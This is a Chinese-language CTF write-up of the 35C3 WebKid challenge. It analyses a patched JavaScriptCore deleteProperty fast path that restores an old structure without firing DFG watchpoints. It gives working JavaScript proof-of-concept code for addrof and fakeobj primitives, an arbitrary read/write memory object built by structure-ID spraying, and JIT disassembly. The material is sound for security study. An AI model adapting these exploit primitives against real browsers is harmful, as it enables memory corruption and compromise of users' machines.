---
title: 35c3CTF WebKid writeup heuristic transition
---

### 一、patch简述

https://github.com/saelo/35c3ctf/blob/master/WebKid/webkid.patch

![image-20190108133641498](35c3CTF WebKid writeup heuristic transition.assets/image-20190108133641498-6925801.png)

一个patch就足够了。patch的核心在于给操作

```c++
thisObject->setStructure(vm, Structure::removePropertyTransition(vm, structure, propertyName, offset));
```

增加了一个fast path。在这个fast path中，假如delete的property是最后一个添加的就把它删去，然后把structureID恢复到上一个。

对比一下正常的行为：

![image-20190108134735998](35c3CTF WebKid writeup heuristic transition.assets/image-20190108134735998-6926456.png)

- patch之前的版本：
  Object: 0x11cdc8580 with butterfly 0x18000fe5c8 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 91

  Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cda7c60:[Array, {outOfLineProperty:100}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282

  Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cda7cd0:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090, UncacheableDictionary, Leaf]), StructureID: 283  

  - delete outOfLineProperty之后StructureID从282增长到283。

- patch之后的版本：
  Object: 0x11cdc8580 with butterfly 0xc000fe5c8 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 91
  Object: 0x11cdc8580 with butterfly 0xc000f8468 (Structure 0x11cda7c60:[Array, {outOfLineProperty:100}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282
  Object: 0x11cdc8580 with butterfly 0xc000f8468 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090]), StructureID: 91

  - delete outOfLineProperty之后StructureID从282回到了之前的91。



一说到structureID的改变，就想到DFG JIT中watchpoint(CodeBlockJettisoningWatchpoint)的fire是靠不同的structure来触发的，一个最简单的原语：

```javascript
function primitiveMaybeNotExploitable(obj) {
    let arr = [1.1, 2.2, 3.3];
    arr.outOfLineProperty = obj;

    function visit() {
        return arr.outOfLineProperty;
    }
    for (let i = 0; i < 0x1000; i++) {
        visit();
    }
    print(describe(arr));
    //Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cda7c60:[Array, {outOfLineProperty:100}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282
    delete arr.outOfLineProperty;
    print(describe(arr));
    //Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090]), StructureID: 91
    return visit();
}
let o = {};
let res = primitiveMaybeNotExploitable(o);
print(res);
//[Object Object]
```

DFG生成的visit()函数在最后一次执行前，structureID为91，按理说已经不包含outOfLineProperty，但由于没有触发watchpoint，代码逻辑没有发生改变，而且butterfly指针保留，仍然能获得相应的引用。这是一个问题，但应该无法做到漏洞利用。

而正常版本的deleteProperty显然会触发watchpoint，最后得出结果是undefined：

```bash
Firing watchpoint 0x11c84d0a0 on visit#ETPOUh:[0x11cd784c0->0x11cd78260->0x11cd98f20, DFGFunctionCall, 35]

Jettisoning visit#ETPOUh:[0x11cd784c0->0x11cd78260->0x11cd98f20, DFGFunctionCall, 35] and counting reoptimization due to UnprofiledWatchpoint, Structure transition from 0x11cda7c60:[Array, {outOfLineProperty:100}, ArrayWithDouble, Proto:0x11cdb4090, Shady leaf].

```

![image-20190108142505592](35c3CTF WebKid writeup heuristic transition.assets/image-20190108142505592-6928705.png)

栈回溯的第12条是原版代码中被fast path越过的代码。removePropertyTransition才是用来触发WatchpointSet::fireAll的函数调用，而patch中只是简单地设置了：

```c++
thisObject->setStructure(vm, previous);
```



### 二、primitive构造

WatchPointSet是通过structure对象索引的，structure对象由structureID确定，因此一个structureID对应一个WatchPointSet。在第一部分的visit()函数中，DFG插入Watchpoint时，arr的类型是ArrayWithDouble并附加一个outOfLineProperty，structureID是282。也就是说WatchPointSet对应strucutre282，那么之后变成structure91之后是没有注册WatchPointSet的，如果再次进行类型转换，仍然不会fire。

![image-20190108144723764](35c3CTF WebKid writeup heuristic transition.assets/image-20190108144723764-6930043.png)

(如果struture91被注册了WatchPointSet，在654行会进行fire)

因此再给代码增加一个transition，用传统的convertDoubleToContiguous：

```javascript
function primitiveAddrOf(obj) {
    let arr = [1.1, 2.2, 3.3];
    arr.outOfLineProperty = 4.4;

    function visit() {
        return arr[0];
    }
    for (let i = 0; i < 0x1000; i++) {
        visit();
    }
    print(describe(arr));
    //Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cda7c60:[Array, {outOfLineProperty:100}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282
    delete arr.outOfLineProperty;
    print(describe(arr));
    //Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090]), StructureID: 91
    arr[0] = obj;
    print(describe(arr));
    //Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cdf27d0:[Array, {}, ArrayWithContiguous, Proto:0x11cdb4090]), StructureID: 92
    return visit();
}
let o = {};
let res = primitiveAddrOf(o);
print(res);
//2.3570356407e-314


function primitiveFakeObj(addr) {
    let arr = [1.1, 2.2, 3.3];
    arr.outOfLineProperty = 4.4;

    let value = addr;
    let res = arr[0];

    function assign() {
        arr[0] = value;
    }
    for (let i = 0; i < 0x1000; i++) {
        assign();
    }
    print(describe(arr));
    //Object: 0x11cdc85a0 with butterfly 0x8000f8468 (Structure 0x11cda7c60:[Array, {outOfLineProperty:100}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282

    delete arr.outOfLineProperty;
    print(describe(arr));
    //Object: 0x11cdc85a0 with butterfly 0x8000f8468 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090]), StructureID: 91

    arr[0] = {};
    print(describe(arr));
    //Object: 0x11cdc85a0 with butterfly 0x8000f8468 (Structure 0x11cdf27d0:[Array, {}, ArrayWithContiguous, Proto:0x11cdb4090]), StructureID: 92

    assign();
    return arr[0];
}
let obj = primitiveFakeObj(res);
print(obj);
//[object Object]
print(describe(obj));
//Object: 0x11c5b0080 with butterfly 0x0 (Structure 0x11c5f1dc0:[Object, {}, NonArray, Proto:0x11c5c8020]), StructureID: 69
```

于是我们有了两个原语，addrof、fakeobj。



### 三、全局读写构造

addof、fakeobj之后，构造全局读写还是比较简单的，基本有模版可参考：

```javascript
let BASE32 = 0x100000000;
function fu(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}
function uf(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}


let conversionBuffer = new ArrayBuffer(8);
let f64 = new Float64Array(conversionBuffer);
let i32 = new Uint32Array(conversionBuffer);

i32[0] = 0x0fffffff;
i32[1] = 0x0fffffff - 0x10000;

let pvLength = f64[0];  //0x0fffffff0fffffff adjacent public/vector length.

let structureIDSprayArray = [];
function sprayRWProxy() {
    for (let i = 0; i < 0x1000; i++) {
        let o = { a: 0xa, b: 0xb, c: pvLength };
        o[0] = 0.1;
        o[1] = 1.1;
        o['outOfLineProperty_' + i.toString(16)] = 2.1;
        //print(describe(o));
        //dbg(0);
        structureIDSprayArray.push(o); //structureID capacity would be above 0x1000;
        if (i == 0xfff) {
            return o;
        }
    }
}
let rwProxy = sprayRWProxy();//rwProxy is NonArrayWithDouble
rwProxy.outOfLineProperty_fff;

function sprayUnboxedArray() {
    for (let i = 0x1000; i < 0x2000; i++) {
        let o = { a: 0xa, b: 0xb, c: 0xc };
        o[0] = 13.37;
        o[1] = 13.37;
        o['outOfLineProperty' + i] = 2.1;
        //print(describe(o));
        //dbg(0);
        structureIDSprayArray.push(o); //structureID capacity would be above 0x2000;
        if (i == 0x1fff) {
            return o;
        }
    }
}
let unboxedArray = sprayUnboxedArray();//boxedArray is NonArrayWithDouble

function sprayBoxedArray() {
    for (let i = 0x2000; i < 0x3000; i++) {
        let o = { a: 0xa, b: 0xb, c: 0xc };
        o[0] = {};
        o[1] = 13.37;
        o['outOfLineProperty' + i] = 2.1;
        //print(describe(o));
        //dbg(0);
        structureIDSprayArray.push(o); //structureID capacity would be above 0x3000;
        if (i == 0x2fff) {
            return o;
        }
    }
}
let boxedArray = sprayBoxedArray();//unboxedArray is NonArrayWithContiguous.


i32[0] = 0x00001000;            //(1)       structureID 0x1000 will be a Object with high probability.
i32[1] = 0x01001506 - 0x10000;  //(2)       ////////////////////////////////////////WHY(1) need to solve.

let container = {
    padding: 0,
    cellHeader: f64[0], //(3) with (1) (2) fake sturcuture ID.
    butterflyPtr: rwProxy,
    mask: 0xfffffff
}
///print(describe(container));
//dbg(0);

let addrContainer = fu(primitiveAddrOf(container));
let addrFakedObject = uf(addrContainer + 0x20);
let refFakedObject = primitiveFakeObj(addrFakedObject);
//print(describe(refFakedObject));                              refFakedObject is NonArrayWithDouble
//dbg(0);

//print(describe(rwProxy));
//print(describe(boxedArray));
//print(describe(unboxedArray));

let addrRWProxy = primitiveAddrOf(rwProxy);
let addrBoxedArray = primitiveAddrOf(boxedArray);
let addrUnboxedArray = primitiveAddrOf(unboxedArray);


let sharedButterfly = fu(refFakedObject[(fu(addrUnboxedArray) - fu(addrRWProxy) + 8) / 8]);

refFakedObject[(fu(addrBoxedArray) - fu(addrRWProxy) + 8) / 8] = uf(sharedButterfly);

let memory = {
    addrof: function (obj) {
        boxedArray[0] = obj;
        return unboxedArray[0];
    },
    fakeobj: function (fValue) {
        unboxedArray[0] = fValue;
        return boxedArray[0];
    },
    read64: function (uAddress) {                           //cannot read 0 out of memory.
        refFakedObject[1] = uf(uAddress + 0x10);
        return this.addrof(rwProxy.outOfLineProperty_fff);
    },
    write64: function (uAddress, fValue) {
        refFakedObject[1] = uf(uAddress + 0x10);
        rwProxy.outOfLineProperty_fff = this.fakeobj(fValue);
    }
};

```

漏洞利用围绕JSValue，细节此处略过。



### 四、CheckStructure与WatchPoint

WatchPoint在fire的时候，会找到InvalidationPoint的位置，然后通过JumpReplacement跳离不安全的DFG代码回到baseline JIT，而CheckStructure则是类似：

![image-20190108145748575](35c3CTF WebKid writeup heuristic transition.assets/image-20190108145748575-6930668.png)

按照前三节的js代码，DFG IR中不存在CheckStruture。



改造一下PoC，使arr通过函数参数arg的形式传入：

```javascript
function primitiveAddrOf(obj) {
    let arr = [1.1, 2.2, 3.3];
    arr.outOfLineProperty = 4.4;

    function visit(arg) {
        return arg[0];
    }

    for (let i = 0; i < 0x1000; i++) {
        visit(arr);
    }
    print(describe(arr));
    delete arr.outOfLineProperty;
    print(describe(arr));
    arr[0] = obj;
    print(describe(arr));
    dbg(0);
    return visit(arr);
}
let o = {};
let res = primitiveAddrOf(o);
print(res);
```

生成的dfg代码稍微发生了变化，可以看到其中虽然没有CheckStructure产生，但有CheckArray：

```bash
Generated DFG JIT code for visit#BFOcsO:[0x11cd784c0->0x11cd78260->0x11cd98f20, DFGFunctionCall, 15 (NeverInline)], instruction count = 15:
    Optimized with execution counter = 1005.000000/1072.000000, 5
    Code at [0x4aac22800820, 0x4aac22800c60):
          0x4aac22800820: push %rbp
          0x4aac22800821: mov %rsp, %rbp
          0x4aac22800824: mov $0x11cd784c0, %r11
		  ...
          0x4aac2280087f: or $0x2, %r15
          0x4aac22800883: test %r15, 0x30(%rbp)
          0x4aac22800887: jnz 0x4aac22800b7e
    Block #0 (bc#0): (OSR target)
      Execution count: 1.000000
      Predecessors:
      Successors:
      Dominated by: #root #0
      Dominates: #0
      Dominance Frontier: 
      Iterated Dominance Frontier: 
          0x4aac2280088d: test $0x7, %bpl
          0x4aac22800891: jz 0x4aac2280089e
		  ...
          0x4aac228008e0: mov $0x1e, %r11d
          0x4aac228008e6: int3 
       0:< 1:->	SetArgument(IsFlushed, this(a), machine:this, W:SideState, bc#0, ExitValid)  predicting Other
       1:< 2:->	SetArgument(IsFlushed, arg1(B<Array>/FlushedCell), machine:arg1, W:SideState, bc#0, ExitValid)  predicting Array
      35:<!3:loc5>	GetLocal(Untyped:@1, JS|MustGen|PureInt, Array, arg1(B<Array>/FlushedCell), machine:arg1, R:Stack(6), bc#0, ExitValid)  predicting Array
          0x4aac228008e7: mov 0x30(%rbp), %rax
      36:<!0:->	CheckArray(Cell:@35, MustGen, Double+Array+InBounds+AsIs, R:JSCell_indexingType,JSCell_structureID,JSCell_typeInfoType, Exits, bc#0, ExitValid)
          0x4aac228008eb: mov $0x11c90b508, %r11
          0x4aac228008f5: mov (%r11), %r11
          0x4aac228008f8: test %r11, %r11
          0x4aac228008fb: jz 0x4aac22800908
          0x4aac22800901: mov $0x113, %r11d
          0x4aac22800907: int3 
          0x4aac22800908: movzx 0x4(%rax), %esi
          0x4aac2280090c: and $0xf, %esi        
          
          
          ------------> rsi == 7(一直以来) rsi == 9(在convertDoubleToContiguous之后)
          
          
          0x4aac2280090f: cmp $0x7, %esi        
          0x4aac22800912: jnz 0x4aac22800ba5
       2:< 6:loc6>	JSConstant(JS|PureInt, Other, Undefined, bc#0, ExitValid)
       3:<!0:->	MovHint(Untyped:@2, MustGen, loc0, W:SideState, ClobbersExit, bc#0, ExitValid)
       5:<!0:->	MovHint(Untyped:@2, MustGen, loc1, W:SideState, ClobbersExit, bc#0, ExitInvalid)
       7:<!0:->	MovHint(Untyped:@2, MustGen, loc2, W:SideState, ClobbersExit, bc#0, ExitInvalid)
       9:<!0:->	MovHint(Untyped:@2, MustGen, loc3, W:SideState, ClobbersExit, bc#0, ExitInvalid)
      11:<!0:->	MovHint(Untyped:@2, MustGen, loc4, W:SideState, ClobbersExit, bc#0, ExitInvalid)
      13:<!0:->	MovHint(Untyped:@2, MustGen, loc5, W:SideState, ClobbersExit, bc#0, ExitInvalid)
      16:< 2:loc6>	JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x11cdcc000 with butterfly 0x0 (Structure %EU:JSGlobalLexicalEnvironment), StructureID: 56, bc#1, ExitValid)
      17:<!0:->	MovHint(Untyped:@16, MustGen, loc3, W:SideState, ClobbersExit, bc#1, ExitValid)
      19:<!0:->	MovHint(Untyped:@16, MustGen, loc4, W:SideState, ClobbersExit, bc#3, ExitValid)
      21:<!0:->	CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc#6, ExitValid)
          0x4aac22800918: mov $0x11c90b508, %r11
          0x4aac22800922: mov (%r11), %r11
          0x4aac22800925: test %r11, %r11
          0x4aac22800928: jz 0x4aac22800935
          0x4aac2280092e: mov $0x113, %r11d
          0x4aac22800934: int3 
      34:<!0:->	InvalidationPoint(MustGen, W:SideState, Exits, bc#7, ExitValid)
          0x4aac22800935: mov $0x11c90b508, %r11
          0x4aac2280093f: mov (%r11), %r11
          0x4aac22800942: test %r11, %r11
          0x4aac22800945: jz 0x4aac22800952
          0x4aac2280094b: mov $0x113, %r11d
          0x4aac22800951: int3 
      23:< 1:loc6>	JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc#7, ExitValid)
      31:< 1:loc7>	GetButterfly(Cell:@35, Storage|PureInt, R:JSObject_butterfly, Exits, bc#7, ExitValid)
          0x4aac22800952: mov $0x11c90b508, %r11
          0x4aac2280095c: mov (%r11), %r11
          0x4aac2280095f: test %r11, %r11
          0x4aac22800962: jz 0x4aac2280096f
          0x4aac22800968: mov $0x113, %r11d
          0x4aac2280096e: int3 
          0x4aac2280096f: test %rax, %r15
          0x4aac22800972: jz 0x4aac2280097f
          0x4aac22800978: mov $0xb4, %r11d
          0x4aac2280097e: int3 
          0x4aac2280097f: mov 0x8(%rax), %rsi
      24:<!3:loc7>	GetByVal(KnownCell:@35, Int32:@23, Untyped:@31, Double|MustGen|VarArgs|UseAsOther, AnyIntAsDouble|NonIntAsdouble, Double+Array+InBounds+AsIs, R:Butterfly_publicLength,IndexedDoubleProperties, Exits, bc#7, ExitValid)  predicting NonIntAsdouble
          0x4aac22800983: mov $0x11c90b508, %r11
          0x4aac2280098d: mov (%r11), %r11
          0x4aac22800990: test %r11, %r11
          0x4aac22800993: jz 0x4aac228009a0
          0x4aac22800999: mov $0x113, %r11d
          0x4aac2280099f: int3 
          0x4aac228009a0: test %rax, %r15
          0x4aac228009a3: jz 0x4aac228009b0
          0x4aac228009a9: mov $0xb4, %r11d
          0x4aac228009af: int3 
          0x4aac228009b0: xor %edx, %edx
          0x4aac228009b2: cmp -0x8(%rsi), %edx
          0x4aac228009b5: jae 0x4aac22800bf3
          0x4aac228009bb: and 0x10(%rax), %edx
          0x4aac228009be: movsd (%rsi,%rdx,8), %xmm0
          0x4aac228009c3: ucomisd %xmm0, %xmm0
          0x4aac228009c7: jp 0x4aac22800c1a
      25:<!0:->	MovHint(DoubleRep:@24<Double>, MustGen, loc6, W:SideState, ClobbersExit, bc#7, ExitInvalid)
      32:< 1:loc6>	ValueRep(DoubleRep:@24<Double>, JS|PureInt, BytecodeDouble, bc#7, exit: bc#13, ExitValid)
          0x4aac228009cd: movq %xmm0, %rax
          0x4aac228009d2: sub %r14, %rax
          0x4aac228009d5: cmp %r14, %rax
          0x4aac228009d8: jae 0x4aac228009e7
          0x4aac228009de: test %rax, %r14
          0x4aac228009e1: jnz 0x4aac228009ee
          0x4aac228009e7: mov $0x3c, %r11d
          0x4aac228009ed: int3 
      27:<!0:->	Return(Untyped:@32, MustGen, W:SideState, Exits, bc#13, ExitValid)
          ...
```

```bash
(lldb) register read $rax
    	rax = 0x000000011cdc8580
(lldb) x/8xb $rax
		0x11cdc8580: 0x5c 0x00 0x00 0x00 0x09 0x20 0x08 0x01    
```

其中0x09这个字节对应的是IndexingType：

![image-20190108215245920](35c3CTF WebKid writeup heuristic transition.assets/image-20190108215245920-6955566.png)

可以看到CheckArray与CheckStructure出现的位置类似，作用也类似。因此在这个PoC的visit()函数中，如果用参数来传递arr将会被检查出来，无法带来类型混淆。